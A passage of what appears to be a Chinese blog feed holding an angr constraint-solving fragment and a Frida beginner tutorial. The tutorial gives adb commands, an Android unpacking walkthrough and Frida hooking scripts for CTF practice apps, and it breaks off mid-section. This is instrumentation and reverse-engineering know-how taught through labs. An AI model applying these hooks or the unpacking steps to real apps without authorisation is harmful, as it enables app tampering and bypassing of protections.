state.solver.eval(x)6</code></pre></blockquote><p>求解完x之后，此时如果求解y，则会得到之前求解结果条件下的y，也就是说，y此时必定小于6</p><p>此外，很明显能够看到，x应该是有多个值的，可以solver中的其他方法取出来：</p><blockquote><ul><li>solver.eval(x):给出表达式的一个可能解</li><li>sovler.eval_one(x):给出表达式的解，如果有多个解，将抛出错误</li><li>solver.eval_upto(x,n)给出表达式的至多n个解</li><li>sovler.eval_taleast(x,n):给出表达式的n个解，如果解的数量少于n，则抛出错误</li><li>solver.eval_exact(x,n):给出表达式的n个解，如果解的个数不为n，则抛出错误</li><li>sovler.min(x):给出表达式的最小解</li><li>sovler.max(x):给出表达式的最大解</li></ul></blockquote><p>这些方法还有两个可省略的参数：</p><blockquote><ul><li><p>extra_constraints：可以作为约束进行求解，但不会被添加到当前状态</p></li><li><p>cast_to：将传递结果转换成指定数据类型，目前只能是int和bytes，例如</p></li><li><pre><code>state.solver.eval(state.solver.BVV(0x41424344, 32), cast_to=bytes)` 将返回`b&#39;ABCD&#39;</code></pre></li></ul></blockquote><p>​       此外，如果将两个互相矛盾的约束加入到一个state当中，那么这个state就会被放到unsat这个stash里面，对这样的state进行求解会导致异常，可以使用**state.satisfiable()**来检查是否有解</p><p>​        加入到状态中的约束在进行约束求解时的关系是“与”的关系，也就是说必须都得满足，那么如果有其他的关系，比如或之类的关系，该如何表示呢？</p><p>​        事实上，根本不会存在或这样的约束之间的关系，因为angr保存所有分支，因此到达某个状态的条件必然是一层一层都满足的情况下到达的，如果在条件判断时有“或”这样的关系存在，那么这样的解将会出现在另一个state当中，而另一个state当中的符号约束之间也必然都是“与”的关系。</p>]]></content>
      
      
      <categories>
          
          <category> Angr入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 符号执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frida入门</title>
      <link href="/2025/04/14/Frida%E5%85%A5%E9%97%A8/"/>
      <url>/2025/04/14/Frida%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Frida入门"><a href="#Frida入门" class="headerlink" title="Frida入门"></a>Frida入门</h1><h5 id="一-Frida的相关链接"><a href="#一-Frida的相关链接" class="headerlink" title="一.Frida的相关链接"></a>一.Frida的相关链接</h5><p>1.Frida server下载：<a href="https://github.com/frida/frida/releases?page=2">Releases · frida&#x2F;frida (github.com)</a></p><p>2.Frida例题：<a href="https://github.com/DERE-ad2001/Frida-Labs">DERE-ad2001&#x2F;Frida-Labs: The repo contains a series of challenges for learning Frida for Android Exploitation. (github.com)</a></p><p><strong>相关指令：</strong></p><p>1.adb version ：显示 adb 版本</p><p>2.adb help：帮助信息，查看adb所支持的所有命令</p><p>3.adb devices：查看当前连接的设备，已连接的设备会显示出来</p><p>4.adb get-serialno：也可以查看设备号</p><p>5.adb root：获取Android管理员（root用户）的权限</p><p>6.adb shell：登录设备 shell，该命令将登录设备的shell（内核），登录shell后，可以使用 cd，ls，rm 等Linux命令</p><p>7.adb -d：如果同时连了usb，又开了模拟器，连接当前唯一通过usb连接的安卓设备</p><p>8.adb -e shell：指定当前连接此电脑的唯一的一个模拟器</p><p>9.adb -s &lt;设备号&gt; shell：当电脑插多台手机或模拟器时，指定一个设备号进行连接</p><p>10.exit：退出</p><p>11.adb kill-server：杀死当前adb服务，如果连不上设备时，杀掉重启。（没事不要用它）</p><p>12.adb start-server：杀掉后重启</p><p>13.adb shell pm list packages：列出当前设备&#x2F;手机，所有的包名</p><p>14.adb shell pm list packages -f：显示包和包相关联的文件(安装路径)</p><p>15.adb shell pm list packages -d：显示禁用的包名<br>16.adb shell pm list packages -e：显示当前启用的包名<br>17.adb shell pm list packages -s：显示系统应用包名<br>18.adb shell pm list packages -3：显示已安装第三方的包名<br>19.adb shell pm list packages xxxx：加需要过滤的包名，如：xxx &#x3D; taobao<br>20.adb install &lt;文件路径\apk&gt;：将本地的apk软件安装到设备(手机)上。如手机外部安装需要密码，        记得手机输入密码。   </p><p>21.adb install -r &lt;文件路径\apk&gt;：覆盖安装</p><p>22.adb install -d &lt;文件路径\apk&gt;：允许降级覆盖安装<br>23.adb install -g &lt;文件路径\apk&gt;：授权&#x2F;获取权限，安装软件时把所有权限都打开<br>24.adb uninstall &lt;包名&gt;：卸载该软件&#x2F;app。<br>      注意：安装时安装的是apk，卸载时是包名，可以通过 adb shell pm list packages 查看需要卸载的包名。<br>25.adb shell pm uninstall -k &lt;包名&gt;：虽然把此应用卸载，但仍保存此应用的数据和缓存<br>26.adb shell am force-stop &lt;包名&gt;：强制退出该应用&#x2F;app</p><p>27.adb push &lt;本地路径\文件或文件夹&gt; &lt;手机端路径&gt;：把本地(pc机)的文件或文件夹复制到设备(手 机)</p><p>注意点1：pc机路径与Android机路径，分隔符是不同的。</p><p>注意点2：复制失败，大概率是无权限。可先使用上面介绍过的两个命令：adb root；adb remount。在使用 adb push 命令</p><p>**adb pull &lt;手机端路径&#x2F;文件或文件夹&gt; &lt;pc机路径&gt;：把设备(手机)的文件或文件夹复制到本地。**注意点同上</p><p>28.更多：</p><p>adb shell logcat -c：清理现有日志<br>adb shell logcat -v time ：输出日志，信息输出在控制台<br>adb shell logcat -v time &gt; &lt;存放路径\log.txt&gt;：输出日志并保存在本地文件<br>Ctrl+C：终止日志抓取<br>adb shell logcat -v time *:E &gt; &lt;存放路径\log.txt&gt;：打印级别为Error的信息<br>日志的等级：<br>-v：Verbse（明细）<br>-d：Debug（调试）<br>-i：Info（信息）<br>-w：Warn（警告）<br>-e：Error（错误）<br>-f：Fatal（严重错误）<br>抓取日志的步骤先输入命令启动日志，然后操作 App，复现 bug，再 ctrl+c 停止日志，分析本地保存的文件。<br>：日志是记录手机系统在运行app时有什么异常的事件<br>EXCEPTION<br>也可以把更详细得Anr日志拉取出来：adb shell pull &#x2F;data&#x2F;anr&#x2F;traces.txt &lt;存放路径&gt;</p><p><strong>adb shell getprop ro.product.model：获取设备型号</strong></p><p><strong>adb shell getprop ro.build.version.release：获取Android系统版本</strong></p><p><strong>adb get-serialno：获取设备的序列号（设备号）</strong></p><p><strong>adb shell wm size：获取设备屏幕分辨率</strong></p><p><strong>adb shell screencap -p &#x2F;sdcard&#x2F;mms.png：屏幕截图<br>adb shell screencap -p &#x2F;sdcard&#x2F;screenshot.png：屏幕截图</strong></p><p><strong>adb pull &#x2F;sdcard&#x2F;mms.png &lt;存放的路径&gt;：将截图导出到本地<br>adb pull &#x2F;sdcard&#x2F;screenshot.png &lt;存放的路径&gt;：将截图导出到本地</strong></p><p><strong>adb shell dumpsys activity |find “mResumedActivity”：查看前台应用包名，必须先启动app，适用于Android 8.0以上</strong></p><p><strong>adb shell cat &#x2F;proc&#x2F;meminfo：获取手机内存信息</strong></p><p><strong>adb shell df：获取手机存储信息</strong></p><p><strong>adb shell screenrecord &lt;存放路径&#x2F;xxx.mp4&gt;：录屏，命名以.mp4结尾<br>adb shell screenrecord –time-limit 10 &lt;存放路径&#x2F;xxx.mp4&gt;：录屏时间为10秒</strong></p><hr><h5 id="二-安卓脱壳–Xposed-反射大师"><a href="#二-安卓脱壳–Xposed-反射大师" class="headerlink" title="二.安卓脱壳–Xposed&amp;反射大师"></a>二.安卓脱壳–Xposed&amp;反射大师</h5><p>例题：[XYCTF]Trust me</p><p><strong>1.分辨是否加壳</strong></p><p>用jadx打开，<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/f2f181ff-9b1d-4381-a3a2-51da7e72f5cd.png" alt="f2f181ff-9b1d-4381-a3a2-51da7e72f5cd"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/08d77483-4d7f-4a79-a46e-1997406c9bfe.png" alt="08d77483-4d7f-4a79-a46e-1997406c9bfe"></p><p>可以看到两个包名不是同一个，也就是说真正的程序入口和jadx反编译出来的不一样，说明可能加壳了，同时还有不少安卓第一代壳的特征，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/498ee0a5-3841-49b5-a312-8a6f78c4f076.png" alt="498ee0a5-3841-49b5-a312-8a6f78c4f076"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/a3010d65-ac47-4c92-87b6-064828defcdd.png" alt="a3010d65-ac47-4c92-87b6-064828defcdd"></p><p>那么这里我们可以用Xposed&amp;反射大师来脱壳，具体安装这里不做过多说明，网上有。我这里用的<strong>夜神模拟器</strong>，<strong>Xposed</strong>，<strong>反射大师</strong>。</p><p>在模拟器上打开反射大师，点击我们需要脱壳的app，然后点击选择这个软件</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/01eaa759-4c60-4920-ad43-1e90d3529783.png" alt="01eaa759-4c60-4920-ad43-1e90d3529783"></p><p>然后点击，打开</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/39db2c26-8297-44b2-ba57-93c9b812cffc.png" alt="39db2c26-8297-44b2-ba57-93c9b812cffc"></p><p>可以看到软件页面中心有个红色六芒星</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/44a5cd61-c8ac-45e7-b856-b2f1b4feaecc.png" alt="44a5cd61-c8ac-45e7-b856-b2f1b4feaecc"></p><p>点击六芒星，可以看到</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/a45c7382-94f6-4784-a3f7-f8651b42e3d7.png" alt="a45c7382-94f6-4784-a3f7-f8651b42e3d7"></p><p>再点击当前ACTIVITY</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/205988b5-9415-4caa-9415-5175e8d3e1f4.png" alt="205988b5-9415-4caa-9415-5175e8d3e1f4"></p><p>长按写出DEX，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/bbaf31a4-2198-42ec-b173-0b2a96e86b7a.png" alt="bbaf31a4-2198-42ec-b173-0b2a96e86b7a"></p><p>点击确定，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/aca4393d-5e0b-4b33-9f8c-8da436036d8d.png" alt="aca4393d-5e0b-4b33-9f8c-8da436036d8d"></p><p>然后点击复制，方便后续pull</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/8d8a410d-8a05-4314-ad89-cb4492500104.png" alt="8d8a410d-8a05-4314-ad89-cb4492500104"></p><p>这里pull出来的文件就是在我们cmd的路径，文件名就叫dump</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/379bc70f-d5e5-4841-9100-5c2b865bfc85.png" alt="379bc70f-d5e5-4841-9100-5c2b865bfc85"></p><p>里面的class.dex就是dump下来的文件，用jadx就可以继续分析了。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/0d64aed0-449e-436a-a3c2-7426b63cc7a9.png" alt="0d64aed0-449e-436a-a3c2-7426b63cc7a9"></p><p>这就是真正正确的app入口，函数整体逻辑就是对数据库的加密，可以用spl注入的万能钥匙，直接秒了，或者就是正在逆向分析，可以找到数据文件，进行异或，<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/3a0e97a5-4d3b-4219-a08d-017b117c9e87.png" alt="3a0e97a5-4d3b-4219-a08d-017b117c9e87"></p><p>就是异或0xFF，这里这个数据库不能用jadx打开，会卡死，可以改文件后缀名，然后找到文件，用010editor打开，进行异或，就可以找到flag。</p><hr><h5 id="三-Frida-用法（1）-js脚本hook一个方法"><a href="#三-Frida-用法（1）-js脚本hook一个方法" class="headerlink" title="三.Frida 用法（1）.js脚本hook一个方法"></a>三.Frida 用法（1）.js脚本hook一个方法</h5><p>1.工具：1.jadx—-用于进行静态分析，也可以进行动态调试（JEB似乎更好）。 </p><p>雷神模拟器 9（Android 9）—-原本自带的adb.exe好像有问题，建议另行自找。（需要root）</p><p>Frida   Frida server</p><p>例题：Frida 0x1</p><p>2.拿到附件，一个.apk文件，我们可以先用MT管理器看看APP入口<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1721640027318.png" title="" alt="1721640027318" data-align="left"></p><p>找到了之后，就可以用jadx打开，先静态分析看看逻辑</p><pre><code class="language-java">package com.ad2001.frida0x1;import android.os.Bundle;import android.text.TextUtils;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.TextView;import android.widget.Toast;import androidx.appcompat.app.AppCompatActivity;import java.util.Random;/* loaded from: classes.dex */public class MainActivity extends AppCompatActivity &#123;    TextView t1;    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity    public void onCreate(Bundle bundle) &#123;        super.onCreate(bundle);        setContentView(R.layout.activity_main);        final EditText editText = (EditText) findViewById(R.id.editTextTextPassword);        this.t1 = (TextView) findViewById(R.id.textview1);        final int i = get_random();        ((Button) findViewById(R.id.button)).setOnClickListener(new View.OnClickListener() &#123; // from class: com.ad2001.frida0x1.MainActivity.1            @Override // android.view.View.OnClickListener            public void onClick(View view) &#123;                String obj = editText.getText().toString();                if (TextUtils.isDigitsOnly(obj)) &#123;                    MainActivity.this.check(i, Integer.parseInt(obj));                &#125; else &#123;                    Toast.makeText(MainActivity.this.getApplicationContext(), &quot;Enter a valid number !!&quot;, 1).show();                &#125;            &#125;        &#125;);    &#125;    int get_random() &#123;        return new Random().nextInt(100);    &#125;    void check(int i, int i2) &#123;        if ((i * 2) + 4 == i2) &#123;            Toast.makeText(getApplicationContext(), &quot;Yey you guessed it right&quot;, 1).show();            StringBuilder sb = new StringBuilder();            for (int i3 = 0; i3 &lt; 20; i3++) &#123;                char charAt = &quot;AMDYV&#123;WVWT_CJJF_0s1&#125;&quot;.charAt(i3);                if (charAt &lt; &#39;a&#39; || charAt &gt; &#39;z&#39;) &#123;                    if (charAt &gt;= &#39;A&#39;) &#123;                        if (charAt &lt;= &#39;Z&#39;) &#123;                            charAt = (char) (charAt - 21);                            if (charAt &gt;= &#39;A&#39;) &#123;                            &#125;                            charAt = (char) (charAt + 26);                        &#125;                    &#125;                    sb.append(charAt);                &#125; else &#123;                    charAt = (char) (charAt - 21);                    if (charAt &gt;= &#39;a&#39;) &#123;                        sb.append(charAt);                    &#125;                    charAt = (char) (charAt + 26);                    sb.append(charAt);                &#125;            &#125;            this.t1.setText(sb.toString());            return;        &#125;        Toast.makeText(getApplicationContext(), &quot;Try again&quot;, 1).show();    &#125;&#125;</code></pre><p>​        可以看到，APP中位于<strong>com.ad2001.frida0x1</strong>包<strong>MainActivity</strong>类的onCreate方法在程序初始化时会调用get_random()<strong>方法生成一个介于0到100之间的随机数并赋值给变量i。同时，监听</strong>button<strong>的点击，当按下按钮后，程序首先判断输入的内容是不是数字，如果是数字就将其从string转化为int，并将该整数与生成的随机数一起传递给</strong>check<strong>方法。接下来，继续分析</strong>check**方法实现了哪些功能。 </p><p>​         <strong>check</strong>方法被传入了两个参数，一个是我们在APP页面输入后提交的的数字i2，一个是程序启动时调用get_random方法生成的<strong>随机数</strong>i。该方法会检查表达式**(i * 2) + 4 &#x3D;&#x3D; i2)**是否成立，如果成立则将正确的flag输出到绑定的textView控件上，反之则会提示“Try again”。 </p><p>​        当然，这个题其实是可以直接逆的，写脚本爆破，但是为了学习frida的用法，我们使用frida来hook出每次程序运行时所生成的随机数i是多少，然后我们再将正确答案输入，便可得到正确flag。</p><p>​         PS：因为使用frida进行hook，也是属于动态调.apk文件，所以我们得在aok文件的AndroidMainfestxml清单里查看application中是否有可调式的属性，如果没有得自行加入。<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1721640598097.png" title="" alt="1721640598097" data-align="left"></p><p>然后就可以开始使用frida进行hook了。</p><p>3.具体操作</p><p>首先先查看adb的连接是否有问题，在终端输入<strong>adb devices</strong><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1721640935229.png" title="" alt="1721640935229" data-align="left"></p><p>然后输入<strong>adb shell</strong>进入手机，接着输入<strong>su</strong>进入超级管理，再输入<strong>cd &#x2F;data&#x2F;local&#x2F;tmp</strong>进入相应目录（网上大部分都是将frida server存入此文件夹。（<strong>注</strong>：frida和frida server版本需一致，同时frida server的类型需与虚拟机（手机）的架构一直，可用指令<strong>adb shell getprop ro.product.cpu.abi</strong>查看具体信息）。进入目录之后，可以看看文件夹里是否有frida server这个文件，<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1721641241680.png" title="" alt="1721641241680" data-align="left"></p><p>然后修改文件权限<strong>chmod 755 frida-server-16.2\ .1-android-x86_64</strong>，紧接着就可以运行了。然后，我另外再打开一个终端窗口，分别输入<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1721641449576.png" alt="1721641449576"></p><p><strong>adb forward tcp:27042 tcp:27042</strong><br><strong>adb forward tcp:27043 tcp:27043</strong>  进行端口转发监听</p><p>最后输入<strong>frida-ps -U</strong>或者<strong>frida-ps -R</strong>看看能否成功输出进程列表，检查frida能否正常使用，<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1721641646506.png" alt="1721641646506"></p><p>我们还需编写脚本</p><pre><code class="language-javascript">// 使用Java.perform函数创建一个特殊的Java上下文，用于执行挂钩和Java类操作Java.perform(function() &#123;                                                   // 获取应用程序中com.ad2001.frida0x1.MainActivity类的引用    var MainActivity = Java.use(&quot;com.ad2001.frida0x1.MainActivity&quot;);    // 重写MainActivity类的get_random方法的实现    MainActivity.get_random.implementation = function() &#123;        // 当get_random方法被调用时，输出一条日志信息        console.log(&quot;MainActivity.get_random is called&quot;);        // 调用原始的get_random方法并获取其返回值        var ret_val = this.get_random();                                        // 输出get_random方法的返回结果        console.log(&quot;MainActivity.get_random result is &quot; + ret_val);        // 返回原始方法的返回值        return ret_val;    &#125;;&#125;);</code></pre><p>保存好，然后我们使用<strong>frida -U -f com.ad2001.frida0x1 -l test.js</strong>(test.js是脚本的绝对路径)<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1721642126293.png" alt="1721642126293"></p><p>再在jadx中点击运行，就可以看到输出了此次app运行时生成的随机数是多少，再计算 (74 * 2) + 4 &#x3D; 152，输入，就可得到flag</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1721642239103.png" alt="1721642239103"></p><p>这就是利用frida hook一个方法的完整过程。</p><p>对应附件：Frida 0X1_1.apk</p><p><strong>总结</strong>：Frida Hook方法的脚本模板：</p><pre><code class="language-js">Java.perform(function() &#123; var &lt;class_reference&gt; = Java.use(“&lt;package_name&gt;.&lt;class&gt;”); &lt;class_reference&gt;.&lt;method_to_hook&gt;.implementation = function(&lt;args&gt;) &#123;      /*        我们自己的方法实现      */    &#125;&#125;</code></pre><hr><h5 id="四-Frida-用法（2）-js脚本hook一个静态方法"><a href="#四-Frida-用法（2）-js脚本hook一个静态方法" class="headerlink" title="四.Frida 用法（2） .js脚本hook一个静态方法"></a>四.Frida 用法（2） .js脚本hook一个静态方法</h5><p>1.工具：还是那几样东西。</p><p>2.例题：Frida 0x2</p><p>3.分析：</p><p>拿到附件apk文件，先安装到雷电9里运行一下，</p><p>没有输入，就是很直白，hook。那么接下来我们用jadx反编译为java看看静态逻辑。</p><pre><code class="language-java">package com.ad2001.frida0x2;import android.os.Bundle;import android.util.Base64;import android.widget.TextView;import androidx.appcompat.app.AppCompatActivity;import javax.crypto.Cipher;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;/* loaded from: classes3.dex */public class MainActivity extends AppCompatActivity &#123;    static TextView t1;    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity    public void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        t1 = (TextView) findViewById(R.id.textview);    &#125;    public static void get_flag(int a) &#123;        if (a == 4919) &#123;            try &#123;                SecretKeySpec secretKeySpec = new SecretKeySpec(&quot;HILLBILLWILLBINN&quot;.getBytes(), &quot;AES&quot;);                Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);                IvParameterSpec iv = new IvParameterSpec(new byte[16]);                cipher.init(2, secretKeySpec, iv);                byte[] decryptedBytes = cipher.doFinal(Base64.decode(&quot;q7mBQegjhpfIAr0OgfLvH0t/D0Xi0ieG0vd+8ZVW+b4=&quot;, 0));                String decryptedText = new String(decryptedBytes);                t1.setText(decryptedText);            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;</code></pre><p>逻辑很简单，有一个静态方法<strong>get_flag</strong>，比较一个参数a是不是4919，是的话就会解密输出flag，一个AES加密，但是，这里没有任何方法会调用这个静态方法，那么我们就可以利用frida编写脚本调用这个静态方法，并且将参数a的值改为正确的，那么就可以输出flag。使用frida的前期工作和例题一一样，但是因为这是静态方法，如果使用指令<strong>frida -U -f 包名 -l 脚本</strong>会出现hook不上的情况，所以我们可以先运行程序，然后使用指令<strong>frida -U ‘Frida 0x2’ -l .\Hook.js</strong>，就可以输出flag了。</p><p>脚本：</p><pre><code class="language-js">Java.perform(function() &#123;    // 声明了一个变量a来表示目标Android应用程序中的Java类。    // Java.use函数指定要使用com.ad2001.frida0x2包中的MainActivity类。    var a = Java.use(&quot;com.ad2001.frida0x2.MainActivity&quot;);    // 调用get_flag方法并传入参数4919    a.get_flag(4919);&#125;);</code></pre><p>运行脚本：</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/bf377131-0114-495d-9e73-890184a88bf5.png" alt="bf377131-0114-495d-9e73-890184a88bf5"></p><p>得到flag</p><p><strong>总结</strong>：Frida 调用静态方法的脚本模板：</p><pre><code class="language-js">Java.perform(function ()&#123;      var &lt;class_reference&gt; = Java.use(“&lt;package_name&gt;.&lt;class&gt;”);      a.function(val); // 需要调用的方法名称 &#125;)</code></pre><hr><h5 id="五-Frida-用法（3）-js脚本更改变量的值"><a href="#五-Frida-用法（3）-js脚本更改变量的值" class="headerlink" title="五.Frida 用法（3）.js脚本更改变量的值"></a>五.Frida 用法（3）.js脚本更改变量的值</h5><p>1.拿到附件apk文件，依旧先安装到雷电模拟器上运行一下看看回显，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/592dae50-4a8b-4703-a6f8-ae27fc3af21f.png" alt="592dae50-4a8b-4703-a6f8-ae27fc3af21f"></p><p>框框一顿点没什么用，那么就开始用jadx静态分析一波吧，看看函数逻辑，</p><pre><code class="language-java">package com.ad2001.frida0x3;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.TextView;import android.widget.Toast;import androidx.appcompat.app.AppCompatActivity;import java.nio.charset.Charset;import java.security.InvalidKeyException;import java.security.NoSuchAlgorithmException;import java.util.Base64;import javax.crypto.BadPaddingException;import javax.crypto.Cipher;import javax.crypto.IllegalBlockSizeException;import javax.crypto.NoSuchPaddingException;import javax.crypto.spec.SecretKeySpec;/* loaded from: classes3.dex */public class MainActivity extends AppCompatActivity &#123;    TextView t1;    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity    public void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        Button btn = (Button) findViewById(R.id.button);        this.t1 = (TextView) findViewById(R.id.textView);        btn.setOnClickListener(new View.OnClickListener() &#123; // from class: com.ad2001.frida0x3.MainActivity.1            @Override // android.view.View.OnClickListener            public void onClick(View v) &#123;                if (Checker.code == 512) &#123;                    byte[] bArr = new byte[0];                    Toast.makeText(MainActivity.this.getApplicationContext(), &quot;YOU WON!!!&quot;, 1).show();                    byte[] KeyData = &quot;glass123&quot;.getBytes();                    SecretKeySpec KS = new SecretKeySpec(KeyData, &quot;Blowfish&quot;);                    byte[] ecryptedtexttobytes = Base64.getDecoder().decode(&quot;MKxsZsY9Usw3ozXKKzTF0ymIaC8rs0AY74GnaKqkUrk=&quot;);                    try &#123;                        Cipher cipher = Cipher.getInstance(&quot;Blowfish&quot;);                        cipher.init(2, KS);                        byte[] decrypted = cipher.doFinal(ecryptedtexttobytes);                        String decryptedString = new String(decrypted, Charset.forName(&quot;UTF-8&quot;));                        MainActivity.this.t1.setText(decryptedString);                        return;                    &#125; catch (InvalidKeyException e) &#123;                        throw new RuntimeException(e);                    &#125; catch (NoSuchAlgorithmException e2) &#123;                        throw new RuntimeException(e2);                    &#125; catch (BadPaddingException e3) &#123;                        throw new RuntimeException(e3);                    &#125; catch (IllegalBlockSizeException e4) &#123;                        throw new RuntimeException(e4);                    &#125; catch (NoSuchPaddingException e5) &#123;                        throw new RuntimeException(e5);                    &#125;                &#125;                Toast.makeText(MainActivity.this.getApplicationContext(), &quot;TRY AGAIN&quot;, 1).show();            &#125;        &#125;);    &#125;&#125;</code></pre><p>逻辑还是很清晰的，就是<strong>com.ad2001.frida0x3</strong>包的<strong>Checker</strong>类中检查参数code的值是否是512，是的话就会输出flag，再来看看<strong>Checker</strong>类的逻辑，<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/b84316aa-77aa-4e8b-9af1-a0c7c1c42edf.png" alt="b84316aa-77aa-4e8b-9af1-a0c7c1c42edf"></p><p>        有个<strong>increase</strong>方法，主函数中有个检测按钮的点击次数，点一次就加2，那么这个题要解出来的话，要么点256次，要么直接解密，但似乎加密的逻辑不是很清晰，再一个方法就是用frida修改code的值，直接改为512，这样一来就可以直接输出flag了。</p><p><strong>脚本</strong>：</p><pre><code class="language-js">/***  * Java.perform 是Frida中的一个函数，用于为脚本创建特殊上下文， * 进入此上下文后，可以执行挂钩方法或访问Java类等操作来控制或观察应用程序的行为。 **/ Java.perform(function () &#123;    // 声明了一个变量a来表示目标Android应用程序中的Java类。    // Java.use函数指定要使用com.ad2001.frida0x3包中的Checker类。    var a = Java.use(&quot;com.ad2001.frida0x3.Checker&quot;);    // 使用变量a将所选类的code变量值修改为512    a.code.value = 512; &#125;);</code></pre><p>        使用frida还是和前面的步骤一样，然后我们输入指令<strong>frida -U -f com.ad2001.frida0x3 -l hook.js</strong>，然后再使用jadx进行动态调试，为的是控制程序运行，点击两次运行，会出现最开始的页面，最后点击Click me，就会出现flag</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/b2eeb84c-a1a9-482b-adc6-f1434a6d376c.png" alt="b2eeb84c-a1a9-482b-adc6-f1434a6d376c"></p><p>得到flag</p><p><strong>总结</strong>：Frida 更改变量值的脚本模板</p><pre><code class="language-js">Java.perform(function ()&#123;      var &lt;class_reference&gt; = Java.use(“&lt;package_name&gt;.&lt;class&gt;”);      &lt;class_reference&gt;.&lt;variable&gt;.value = &lt;value&gt;; //需要修改的变量 &#125;)</code></pre><hr><h5 id="六-Frida-用法（4）-js脚本创建类实例"><a href="#六-Frida-用法（4）-js脚本创建类实例" class="headerlink" title="六. Frida 用法（4）.js脚本创建类实例"></a>六. Frida 用法（4）.js脚本创建类实例</h5><p>工具不变，拿到附件apk文件，依旧先安装到雷神模拟器上安装运行一下。没有任何输入框或者按钮，只有一个打招呼的。那么就丢到jadx里分析看看具体函数逻辑，<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/bc871d60-adf0-4209-8577-98455a572801.png" alt="bc871d60-adf0-4209-8577-98455a572801"></p><p>这是<strong>MainActivity</strong>类，没啥有用的信息。再看看<strong>Check</strong>类<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/22979e97-83bc-4149-83e5-29d9e1f54005.png" alt="22979e97-83bc-4149-83e5-29d9e1f54005"></p><p>判断参数a的值是否是1337，是的话就会把解码的flag输出，但是，这个类以及类中的方法并没有在程序的任何地方被使用，因此我们仅仅打开程序无法获取到flag的值，同时，这里的get_flag方法并不是静态方法。所以我们就可以利用frida创建一个实例，再用这个实例来调用这个方法，进而输出flag。</p><p>那么我们就可以开始操作了，前期开始工作是一样的，然后我们直接使用脚本，</p><pre><code class="language-js">Java.perform(function() &#123;    var check = Java.use(&quot;com.ad2001.frida0x4.Check&quot;);    // 声明了一个变量 check 来表示目标 Android 应用程序中的 Java 类。    // Java.use 函数指定要使用 com.ad2001.frida0x4 包的 Check 类。    var check_obj = check.$new();     // $new() 是 Frida 中的方法，用于实例化特定类的对象；    // 使用 $new() 方法创建 Check 类的实例 check_obj。    var res = check_obj.get_flag(1337);     // 使用 check_obj 实例调用 get_flag，并传入参数 1337。    // 创建一个变量 res 来保存 get_flag 方法的返回值。    console.log(&quot;FLAG：&quot; + res);    // 将保存的 flag 输出到脚本运行日志中。&#125;);</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/0feeea01-c0ea-429c-9631-9c1d5e923db3.png" alt="0feeea01-c0ea-429c-9631-9c1d5e923db3"></p><p>拿到flag</p><p><strong>总结</strong>：Frida 创建类实例的脚本模板</p><pre><code class="language-js">Java.perform(function() &#123;  var &lt;class_reference&gt; = Java.use(&quot;&lt;package_name&gt;.&lt;class&gt;&quot;);  var &lt;class_instance&gt; = &lt;class_reference&gt;.$new(); // 创建类的实例  &lt;class_instance&gt;.&lt;method&gt;(); // 调用该实例中的方法&#125;)</code></pre><hr><h5 id="七-Frida-用法（5）-js脚本在现有实例上调用方法"><a href="#七-Frida-用法（5）-js脚本在现有实例上调用方法" class="headerlink" title="七.Frida 用法（5） .js脚本在现有实例上调用方法"></a>七.Frida 用法（5） .js脚本在现有实例上调用方法</h5><p>1.拿到附件，还是老样子，先到模拟器运行一下</p><p><img 